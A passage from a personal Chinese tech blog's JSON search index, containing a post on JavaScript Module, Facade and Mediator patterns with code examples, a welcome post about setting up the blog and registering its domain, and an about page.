","permalink":"http://bingerambo.com/posts/2016/08/javascript-%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1-02/","tags":["JS"],"title":"JavaScript 模式设计-02"},{"categories":["JS"],"contents":" \u0026ldquo;The key is to acknowledge from the start that you have no idea how this will grow. When you accept that you don\u0026rsquo;t know everything, you begin to design the system defensively. You identify the key areas that may change, which often is very easy when you put a little bit of time into it. For instance, you should expect that any part of the app that communicates with another system will likely change, so you need to abstract that away.\u0026rdquo; ——一切皆可变，所以要抽象。\n 模块论  大家可能都或多或少地使用了模块化的代码，模块是一个完整的强健程序架构的一部分，每个模块都是为了单独的目的为创建的，回到Gmail，我们来个例子，chat聊天模块看起来是个单独的一部分，其实它是有很多单独的子模块来构成，例如里面的表情模块其实就是单独的子模块，也被用到了发送邮件的窗口上。 另外一个是模块可以动态加载，删除和替换。 在JavaScript里，我们有几种方式来实现模块，大家熟知的是module模式和对象字面量,如果你已经熟悉这些，请忽略此小节，直接跳到CommonJS部分。 Module模式 module模式是一个比较流行的设计模式，它可以通过大括号封装私有的变量，方法，状态的，通过包装这些内容，一般全局的对象不能直接访问，在这个设计模式里，只返回一个API，其它的内容全部被封装成私有的了。 另外，这个模式和自执行的函数表达式比较相似，唯一的不同是module返回的是对象，而自执行函数表达式返回的是function。 众所周知， JavaScript不想其它语言一样有访问修饰符，不能为每个字段或者方法声明private,public修饰符，那这个模式我们是如何实现的呢？那就是return一个对象，里面包括一些公开的方法，这些方法有能力去调用内部的对象。 看一下，下面的代码，这段代码是一个自执行代码，声明里包括了一个全局的对象basketModule， basket数组是一个私有的，所以你的整个程序是不能访问这个私有数组的，同时我们return了一个对象，其内包含了3个方法（例如addItem,getItemCount,getTotal)，这3个方法可以访问私有的basket数组。 var basketModule = (function() {\nvar basket = []; //privatereturn { //exposed to public　addItem: function(values) {\nbasket.push(values);\n},\ngetItemCount: function() {\nreturn basket.length;\n},\ngetTotal: function(){\nvar q = this.getItemCount(),p=0;\nwhile(q--){\np+= basket[q].price;\n}\nreturn p;\n}\n}\n}());   同时注意，我们return的对象直接赋值给了basketModule，所以我们可以像下面一样使用： //basketModule is an object with properties which can also be methodsbasketModule.addItem({item:'bread',price:0.5});\nbasketModule.addItem({item:'butter',price:0.3});\nconsole.log(basketModule.getItemCount());\nconsole.log(basketModule.getTotal());\n//however, the following will not work:console.log(basketModule.basket);//(undefined as not inside the returned object)console.log(basket); //(only exists within the scope of the closure)   那在各个流行的类库（如Dojo, jQuery)里是如何来做呢？  Dojo   Dojo试图使用dojo.declare来提供class风格的声明方式，我们可以利用它来实现Module模式，例如如果你想再store命名空间下声明basket对象，那么可以这么做：  //traditional way var store = window.store || {};\nstore.basket = store.basket || {};\n//using dojo.setObject dojo.setObject(\"store.basket.object\", (function() {\nvar basket = [];\nfunction privateMethod() {\nconsole.log(basket);\n}\nreturn {\npublicMethod: function(){\nprivateMethod();\n}\n};\n}()));  结合dojo.provide一起来使用，非常强大。\n YUI 下面的代码是YUI原始的实现方式：\nYAHOO.store.basket = function () {\n//\"private\" variables: var myPrivateVar = \"I can be accessed only within YAHOO.store.basket .\";\n//\"private\" method: var myPrivateMethod = function () {\nYAHOO.log(\"I can be accessed only from within YAHOO.store.basket\");\n}\nreturn {\nmyPublicProperty: \"I'm a public property.\",\nmyPublicMethod: function () {\nYAHOO.log(\"I'm a public method.\");\n//Within basket, I can access \"private\" vars and methods: YAHOO.log(myPrivateVar);\nYAHOO.log(myPrivateMethod());\n//The native scope of myPublicMethod is store so we can //access public members using \"this\": YAHOO.log(this.myPublicProperty);\n}\n};\n} ();  \u0026nbsp;\n jQuery  jQuery里有很多Module模式的实现，我们来看一个不同的例子，一个library函数声明了一个新的library，然后创建该library的时候，在document.ready里自动执行init方法。 function library(module) {\n$(function() {\nif (module.init) {\nmodule.init();\n}\n});\nreturn module;\n}\nvar myLibrary = library(function() {\nreturn {\ninit: function() {\n/*implementation*/\n}\n};\n}());   对象自面量 对象自面量使用大括号声明，并且使用的时候不需要使用new关键字，如果对一个模块里的属性字段的publice/private不是很在意的话，可以使用这种方式，不过请注意这种方式和JSON的不同。对象自面量： var item={name: \"tom\", value:123}  JSON: var item={\"name\":\"tom\", \"value\":123} 。 var myModule = {\nmyProperty: 'someValue',\n//object literals can contain properties and methods. //here, another object is defined for configuration //purposes: myConfig: {\nuseCaching: true,\nlanguage: 'en'\n},\n//a very basic method myMethod: function () {\nconsole.log('I can haz functionality?');\n},\n//output a value based on current configuration myMethod2: function () {\nconsole.log('Caching is:' + (this.myConfig.useCaching) ? 'enabled' : 'disabled');\n},\n//override the current configuration myMethod3: function (newConfig) {\nif (typeof newConfig == 'object') {\nthis.myConfig = newConfig;\nconsole.log(this.myConfig.language);\n}\n}\n};\nmyModule.myMethod(); //I can haz functionalitymyModule.myMethod2(); //outputs enabledmyModule.myMethod3({ language: 'fr', useCaching: false }); //fr   CommonJS 关于 CommonJS的介绍，这里就不多说了，博客园有很多帖子都有介绍，我们这里要提一下的是CommonJS标准里里有2个重要的参数exports和require，exports是代表要加载的模块，require是代表这些加载的模块需要依赖其它的模块，也需要将它加载进来。  /*Example of achieving compatibility with AMD and standard CommonJS by putting boilerplate around the standard CommonJS module format:\n*/\n(function(define){\ndefine(function(require,exports){\n//module contents var dep1 = require(\"dep1\");\nexports.someExportedFunction = function(){...};\n//... });\n})(typeof define==\"function\"?define:function(factory){factory(require,exports)});   有很多CommonJS标准的模块加载实现，我比较喜欢的是RequireJS，它能否非常好的加载模块以及相关的依赖模块，来一个简单的例子，例如需要将图片转化成ASCII码，我们先加载encoder模块，然后获取他的encodeToASCII方法，理论上代码应该是如下：  var encodeToASCII = require(\"encoder\").encodeToASCII;\nexports.encodeSomeSource = function(){\n//其它操作以后，然后调用encodeToASCII }   但是上述代码并没用工作，因为encodeToASCII函数并没用附加到window对象上，所以不能使用，改进以后的代码需要这样才行：  define(function(require, exports, module) {\nvar encodeToASCII = require(\"encoder\").encodeToASCII;\nexports.encodeSomeSource = function(){\n//process then call encodeToASCII }\n});  CommonJS 潜力很大，但是由于大叔不太熟，所以就不过多地介绍了。\nFacade模式  Facade模式在本文架构里占有重要角色，关于这个模式很多JavaScript类库或者框架里都有体现，其中最大的作用，就是包括High level的API，以此来隐藏具体的实现，这就是说，我们只暴露接口，内部的实现我们可以自己做主，也意味着内部实现的代码可以很容易的修改和更新，比如今天你是用jQuery来实现的，明天又想换YUI了，这就非常方便了。 下面这个例子了，可以看到我们提供了很多私有的方法，然后通过暴露一个简单的 API来让外界执行调用内部的方法：\nvar module = (function () {\nvar _private = {\ni: 5,\nget: function () {\nconsole.log('current value:' + this.i);\n},\nset: function (val) {\nthis.i = val;\n},\nrun: function () {\nconsole.log('running');\n},\njump: function () {\nconsole.log('jumping');\n}\n};\nreturn {\nfacade: function (args) {\n_private.set(args.val);\n_private.get();\nif (args.run) {\n_private.run();\n}\n}\n}\n} ());\nmodule.facade({run:true,val:10});//outputs current value: 10, running   Facade和下面我们所说的mediator的区别是，facade只提供现有存在的功能，而mediator可以增加新功能。 \u0026nbsp;\nMediator模式  讲modiator之前，我们先来举个例子，机场飞行控制系统，也就是传说中的塔台，具有绝对的权利，他可以控制任何一架飞机的起飞和降落时间以及地方，而飞机和飞机之前不允许通信，也就是说塔台是机场的核心，mediator就相当于这个塔台。  mediator就是用在程序里有多个模块，而你又不想让各个模块有依赖的话，那通过mediator模式可以达到集中控制的目的。实际场景中也是，mediator封装了很多不想干的模块，让他们通过mediator联系在一起，同时也松耦合他们，使得他们之间必须通过mediator才能通信。  那mediator模式的优点是什么？那就是解耦，如果你之前对观察者模式比较了解的话，那理解下面的mediator图就相对简单多了，下图是一个high level的mediator模式图：  想想一下，各模块是发布者，mediator既是发布者又是订阅者。\n Module 1向Mediator广播一个实际，说需要做某事  Mediator捕获消息以后，立即启动处理该消息需要使用的Module 2，Module 2处理结束以后返回信息给Mediator   与此同时，Mediator也启动了Module 3，当接受Module 2 返回消息的时候自动记录日志到Module 3里    可以看到，各模块之间并没有通信，另外Mediator也可以实现监控各模块状态的功能，例如如果Module 3出错了，Mediator可以暂时只想其它模块，然后重启Module 3，然后继续执行。  回顾一下，可以看到，Mediator的优点是：松耦合的模块由同一的Mediator来控制，模块只需要广播和监听事件就可以了，而模块之间不需要直接联系，另外，一次信息的处理可以使用多个模块，也方便我们以后统一的添加新的模块到现有的控制逻辑里。 确定是：由于所有的模块直接都不能直接通信，所有相对来说，性能方面可能会有少许下降，但是我认为这是值得的。\n\u0026nbsp;\n我们根据上面的讲解来一个简单的Demo：\n var mediator = (function(){\nvar subscribe = function(channel, fn){\nif (!mediator.channels[channel]) mediator.channels[channel] = [];\nmediator.channels[channel].push({ context: this, callback: fn });\nreturn this;\n},\npublish = function(channel){\nif (!mediator.channels[channel]) return false;\nvar args = Array.prototype.slice.call(arguments, 1);\nfor (var i = 0, l = mediator.channels[channel].length; i \u0026lt; l; i++) {\nvar subscription = mediator.channels[channel][i];\nsubscription.callback.apply(subscription.context, args);\n}\nreturn this;\n};\nreturn {\nchannels: {},\npublish: publish,\nsubscribe: subscribe,\ninstallTo: function(obj){\nobj.subscribe = subscribe;\nobj.publish = publish;\n}\n};\n}());  然后有2个模块分别调用：\n //Pub/sub on a centralized mediator mediator.name = \"tim\";\nmediator.subscribe('nameChange', function(arg){\nconsole.log(this.name);\nthis.name = arg;\nconsole.log(this.name);\n});\nmediator.publish('nameChange', 'david'); //tim, david //Pub/sub via third party mediator var obj = { name: 'sam' };\nmediator.installTo(obj);\nobj.subscribe('nameChange', function(arg){\nconsole.log(this.name);\nthis.name = arg;\nconsole.log(this.name);\n});\nobj.publish('nameChange', 'john'); //sam, john   应用Facade: 应用程序核心的抽象   一个facade是作为应用程序核心的一个抽象来工作的，在mediator和模块之间负责通信，各个模块只能通过这个facade来和程序核心进行通信。作为抽象的职责是确保任何时候都能为这些模块提供一个始终如一的接口（consistent interface），和sendbox controller的角色比较类似。所有的模块组件通过它和mediator通信，所以facade需要是可靠的，可信赖的，同时作为为模块提供接口的功能，facade还需要扮演另外一个角色，那就是安全控制，也就是决定程序的哪个部分可以被一个模块访问，模块组件只能调用他们自己的方法，并且不能访问任何未授权的内容。例如，一个模块可能广播dataValidationCompletedWriteToDB，这里的安全检查需要确保该模块拥有数据库的写权限。  总之，mediator只有在facade授权检测以后才能进行信息处理。 应用Mediator：应用程序的核心  Mediator是作为应用程序核心的角色来工作的，我们简单地来说一下他的职责。最核心的工作就是管理模块的生命周期（lifecycle），当这个核心扑捉到任何信息进来的时候，他需要判断程序如何来处理\u0026mdash;\u0026mdash;也就是说决定启动或停止哪一个或者一些模块。当一个模块开始启动的时候，它应该能否自动执行，而不需要应用程序核心来决定是否该执行（比如，是否要在DOM ready的时候才能执行），所以说需要模块自身需要去判定。 你可能还有问题，就是一个模块在什么情况下才会停止。当程序探测到一个模块失败了，或者是出错了，程序需要做决定来防止继续执行该模块里的方法，以便这个组件可以重新启动，目的主要是提高用户体验。 另外，该核心应该可以动态添加或者删除模块，而不影响其他任何功能。常见的例子是，一个模块在页面加载初期是不可用，但是用户操作以后，需要动态加载这个模块然后执行，就像Gmail里的chat聊天功能一样，从性能优化的目的来看，应该是很好理解的吧。 异常错误处理，也是由应用程序核心来处理的，另外各模块在广播信息的时候，也广播任何错误到该核心里，以便程序核心可以根据情况去停止/重启这些模块。这也是松耦合架构一个很重要的部分，我们不需要手工改变任何模块，通过mediator使用发布/订阅就可以来做到这个。 组装起来  各模块 包含了程序里各种各样的功能，他们有信息需要处理的时候，发布信息通知程序（这是他们的主要职责），下面的QA小节里提到了，模块可以依赖一些DOM工具操作方法，但是不应该和系统的其它模块有依赖，一个模块不应该关注如下内容：  哪个对象或者模块订阅了这个模块发布的信息 这些对象是客户端对象还是服务器端对象 多少对象订阅了你的信息  \u0026nbsp;\n  Facade抽象 应用程序的核心，避免各个模块之间直接通信，它从各模块上订阅信息，也负责授权检测，确保每个模块有用自己单独的授权。   Mediator(应用程序核心）使用mediator模式扮演发布/订阅管理器的角色，负责模块管理以及启动/停止模块执行，可以动态加载以及重启有错误的模块。   这个架构的结果是：各模块之间没有依赖，因为松耦合的应用，它们可以很容易地被测试和维护，各模块可以很容易地在其它项目里被重用，也可以在不影响程序的情况下动态添加和删除。  感谢Nicholas Zakas的原始贴，将思想总结在一起,感谢Andree Hansson的technical review,感谢Rebecca Murphey, Justin Meyer, John Hann, Peter Michaux, Paul Irish和Alex Sexton,他们所有的人都提供了和本Session相关的很多资料。\n也非常感谢博客园的汤姆大叔(TomXu），将本Session的内容整理成中文版本，如对你有用，请推荐一把。 阅读原文\n","permalink":"http://bingerambo.com/posts/2016/07/javascript-%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1-01/","tags":["JS"],"title":"JavaScript 模式设计-01"},{"categories":["生活"],"contents":"开博了，等你来\n “只有初恋般的热情和宗教般的意志，人才可能成就某种事业。” ——路遥\n 前言 Binge Blog 终于慢腾腾地开通了。。。\n两年前就想搭个站玩玩，结果各种原因未能实现。\n直到今年，这种想法日益强烈，光说不干假把式，于是，利用两个周末时间，完成自己的小站。\n这样，能有个地儿可以折腾点自己的东西，还是蛮有意思的。\n正所谓：站不在大，好玩就中！\n 正文 关于小站：\n1. 找空间  稳定； 大，大，大； 便于管理； 要流行； 要时尚； \u0026hellip;\u0026hellip;  于是，我选择了Octocat。。。\n注：Octocat（章鱼猫）＝ Octopus（章鱼）+ Cat（猫）\n2. 注册域名   刚开始，在godaddy注册了域名。没有VISA和paypal不要紧，可使用alipay支付宝。 用了两三天，便收到了godaddy的邮件通知：将要收回域名，付款将会全额退还。具体原因，此处不赘述。最后，收到退款，免费玩了三天域名。\n  分享下godaddy域名使用体会：\n 优点：  com域名免认证，可快速生效； 可以使用优惠码，价格有优惠；   缺点：  国内会出现无法解析的问题，需要自己动手解决； 会公开域名注册人的信息（包括联系电话），如果想要隐私保护，需要额外付费才能享受信息保护服务。 以前的价格优势已无，对于部分域名注册费用还要比国内贵得多；      后来，就在万网注册个域名。com域名带认证，不到半天就搞定。\n  分享下万网域名使用体会：\n 流程简单，配置方便； 阿里云解析，生效速度很快。比如一些免认证的域名，一两分钟就能生效使用； 域名购买后，有账单发票，且有域名证书图片。便于用户声明域名所有权。    小站域名：\n bingerambo.com：外号binge名称域名已被国外注册。想起《第一滴血》里史泰龙扮演的硬汉兰博。于是就再加上rambo,便有了bingerambo。    3. 内容  自己整理：笔记和感想，有关技术、阅读、兴趣和其它杂谈。希望积跬步，致千里。 好友原创：好友写的文章，分享到小站。 欢迎投稿：文章、图片都可。 如果您的原创和投稿，入驻小站，都是小编我的荣幸。  4. 友情链接介绍   Tuantuan.G：是设计师，也是小伙伴。有想法，有理念。爱画画，有创意。从视觉设计，到UI平面。哪怕通宵达旦，也要设计漂亮。。。去她那里逛逛吧：@Tuantuan.G\n  索洪波：是程序员，也是段子手，低调深刻有内涵。去他的小站看看吧：@索洪波\n  后记 小站发布，记录点滴生活。。。\n  特别感谢 [Tuantuan.G]，在百忙之余，提供了丰富的图片素材。让我方便修图，配图攒文。同时，也对小站的完善提出了宝贵建议，并分享其原创作品。\n  感谢看到这里的你。。。\n   最后，希望来这儿逛的你，好心情~~~\n","permalink":"http://bingerambo.com/posts/2016/06/welcome-to-binge-blog/","tags":["生活"],"title":"Welcome to Binge Blog"},{"categories":null,"contents":"自言   偶尔复制点代码，偶尔鼓捣些东西。\n花鸟鱼虫，稀松不通。\n文明精神，野蛮体魄。\n借我三千虎贲，踏破贺兰山缺。\n  我是术业不精的运动程序猿，搭个小站，随写心得。欢迎大家来逛~~~ o(∩_∩)o     ","permalink":"http://bingerambo.com/about/","tags":null,"title":"关于"},{"categories":null,"contents":"\n","permalink":"http://bingerambo.com/search/","tags":null,"title":"Search"}]